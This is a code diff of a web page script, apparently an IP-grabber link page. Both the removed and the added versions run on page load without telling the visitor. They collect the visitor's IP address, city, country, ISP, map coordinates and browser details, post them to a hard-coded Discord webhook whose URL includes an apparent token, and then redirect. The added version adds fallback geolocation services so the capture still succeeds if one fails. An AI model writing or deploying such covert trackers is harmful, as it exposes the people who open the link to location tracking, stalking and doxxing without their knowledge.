@@ -4,59 +4,43 @@
 <script>
 const webhook = "https://discord.com/api/webhooks/1532569658543177738/GytKMid4oNbpE8jS9X_zdcqJf1ZcW23V3_V9LYOST85C4v5ZWbtT198sLiZStmZJdyOk";
 
-// Get IP from external API
-function getIP() {
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            // Send IP to webhook
-            fetch(webhook, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: "**IP ADDRESS:** " + data.ip + "\n**User-Agent:** " + navigator.userAgent + "\n**Time:** " + new Date().toISOString()
-                })
-            });
-            
-            // Also try to get location
-            fetch('https://ipapi.co/' + data.ip + '/json/')
-                .then(res => res.json())
-                .then(location => {
-                    fetch(webhook, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            content: "**Location:** " + location.city + ", " + location.region + ", " + location.country_name + "\n**ISP:** " + location.org + "\n**Coordinates:** " + location.latitude + ", " + location.longitude
-                        })
-                    });
-                });
-        });
-}
-
-// Get all browser info
-function getBrowserInfo() {
-    return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenResolution: screen.width + "x" + screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        referrer: document.referrer,
-        cookiesEnabled: navigator.cookieEnabled
-    };
-}
-
-// Execute
-getIP();
-
-const info = getBrowserInfo();
-fetch(webhook, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-        content: "**Browser Info:**\n```json\n" + JSON.stringify(info, null, 2) + "\n```"
+// Method 1: Using a different IP service
+fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(data => {
+        return fetch('https://ipinfo.io/' + data.ip + '/json');
     })
-});
+    .then(r => r.json())
+    .then(location => {
+        const message = {
+            content: "**IP:** " + location.ip + 
+                    "\n**City:** " + location.city + 
+                    "\n**Region:** " + location.region + 
+                    "\n**Country:** " + location.country +
+                    "\n**ISP:** " + location.org +
+                    "\n**Location:** https://maps.google.com/?q=" + location.loc
+        };
+        
+        return fetch(webhook, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(message)
+        });
+    })
+    .catch(() => {
+        // Fallback: Use a different service
+        fetch('https://geolocation-db.com/json/')
+            .then(r => r.json())
+            .then(data => {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: "**IP:** " + data.IPv4 + "\n**City:** " + data.city + "\n**Country:** " + data.country_name
+                    })
+                });
+            });
+    });
 
 // Redirect
 setTimeout(() => {
